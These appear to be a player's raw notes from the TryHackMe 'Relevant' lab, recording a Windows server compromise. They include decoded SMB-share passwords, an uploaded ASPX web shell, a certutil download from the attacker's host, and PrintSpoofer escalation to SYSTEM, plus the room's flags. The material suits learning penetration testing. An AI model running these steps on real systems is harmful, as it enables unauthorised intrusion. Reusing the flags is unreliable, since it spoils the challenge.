thm - 2021_05_20 Relevant.md

# Relevant

## Basic stuff
└─$ nmap -sV -sC -o nmap 10.10.199.92                                                                 3 ⚙
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-20 10:18 EDT
Nmap scan report for 10.10.199.92
Host is up (0.36s latency).
Not shown: 995 filtered ports
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Windows Server 2016 Standard Evaluation 14393 microsoft-ds
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: RELEVANT
|   NetBIOS_Domain_Name: RELEVANT
|   NetBIOS_Computer_Name: RELEVANT
|   DNS_Domain_Name: Relevant
|   DNS_Computer_Name: Relevant
|   Product_Version: 10.0.14393
|_  System_Time: 2021-05-20T14:18:40+00:00
| ssl-cert: Subject: commonName=Relevant
| Not valid before: 2021-05-19T14:07:46
|_Not valid after:  2021-11-18T14:07:46
|_ssl-date: 2021-05-20T14:19:20+00:00; 0s from scanner time.
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h24m00s, deviation: 3h07m50s, median: 0s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)
|   Computer name: Relevant
|   NetBIOS computer name: RELEVANT\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-05-20T07:18:40-07:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-05-20T14:18:44
|_  start_date: 2021-05-20T14:08:07

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 71.58 seconds



Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-26 02:14 EDT
Nmap scan report for 10.10.27.108
Host is up (0.25s latency).
Not shown: 65527 filtered ports
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
49663/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown

the last 3 ports are normally used for online virtual environment liks aws


[User Passwords - Encoded]
Qm9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk
/tmp/smbmore.k4kFsZ (END)

┌──(kali㉿kali)-[~/tryhackme/relevant]
└─$ echo "Qm9iIC0gIVBAJCRXMHJEITEyMw==" | base64 -d
Bob - !P@$$W0rD!123

┌──(kali㉿kali)-[~/tryhackme/relevant]
└─$ echo "QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk" | base64 -d
Bill - Juw4nnaM4n420696969!$$$ 



./evil-winrm.rb -i 10.10.42.202 -u Bob -p '!P@$$W0rD!123'

Evil-WinRM shell v2.4

Info: Establishing connection to remote endpoint

Error: An error of type HTTPClient::ConnectTimeoutError happened, message is execution expired                                                                                    

Error: Exiting with code 1


http://10.10.77.204:49663/nt4wrksv/dog.aspx


c:\windows\system32\inetsrv>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled


:\Users\Bob\Desktop>type user.txt
type user.txt
THM{fdk4ka34vk346ksxfr21tg789ktf45}
c:\Users\Bob\Desktop>


c:\Users\Bob>certutil -urlcache -f http://10.11.37.146:8000/winPEAS.bat winPEAS.bat
certutil -urlcache -f http://10.11.37.146:8000/winPEAS.bat winPEAS.bat



:\inetpub\wwwroot>cd nt4wrksv                                                                                                                             
cd nt4wrksv                                                                                                                                                
                                                                                                                                                           
c:\inetpub\wwwroot\nt4wrksv>dir                                                                                                                            
dir                                                                                                                                                        
 Volume in drive C has no label.                                                                                                                           
 Volume Serial Number is AC3C-5CB5                                                                                                                         
                                                                                                                                                           
 Directory of c:\inetpub\wwwroot\nt4wrksv                                                                                                                  
                                                                                                                                                           
05/26/2021  04:12 AM    <DIR>          .                                                                                                                   
05/26/2021  04:12 AM    <DIR>          ..                                                                                                                  
05/26/2021  03:37 AM             3,389 cat.aspx                                                                                                            
05/26/2021  03:31 AM             3,392 dog.aspx                                                                                                            
07/25/2020  08:15 AM                98 passwords.txt                                                                                                       
05/26/2021  03:34 AM             3,423 pig.aspx                                                                                                            
05/26/2021  04:12 AM            27,136 PrintSpoofer.exe                                                                                                    
               5 File(s)         37,438 bytes                                                                                                              
               2 Dir(s)  21,040,545,792 bytes free                                                                                                         
                                                                                                                                                           
c:\inetpub\wwwroot\nt4wrksv>PrintSpoofer.exe -i -c cmd                                                                                                     
PrintSpoofer.exe -i -c cmd                                                                                                                                 
[+] Found privilege: SeImpersonatePrivilege                                                                                                                
[+] Named pipe listening...                                                                                                                                
[+] CreateProcessAsUser() OK                                                                                                                               
Microsoft Windows [Version 10.0.14393]                                                                                                                     
(c) 2016 Microsoft Corporation. All rights reserved.                                                                                                       
                                                                                                                                                           
C:\Windows\system32>whoami                                                                                                                                 
whoami                                                                                                                                                     
nt authority\system                                                                                                                                        
                                                                                                                                                           
C:\Windows\system32>      




C:\Users\Administrator\Desktop>dir                                                                                                                         
dir                                                                                                                                                        
 Volume in drive C has no label.                                                                                                                           
 Volume Serial Number is AC3C-5CB5                                                                                                                         
                                                                                                                                                           
 Directory of C:\Users\Administrator\Desktop                                                                                                               
                                                                                                                                                           
07/25/2020  08:24 AM    <DIR>          .                                                                                                                   
07/25/2020  08:24 AM    <DIR>          ..                                                                                                                  
07/25/2020  08:25 AM                35 root.txt                                                                                                            
               1 File(s)             35 bytes                                                                                                              
               2 Dir(s)  21,040,545,792 bytes free                                                                                                         
                                                                                                                                                           
C:\Users\Administrator\Desktop>type root.txt                                                                                                               
type root.txt                                                                                                                                              
THM{1fk5kf469devly1gl320zafgl345pv}                                                                                                                        
C:\Users\Administrator\Desktop>    


completed 26may2021 1916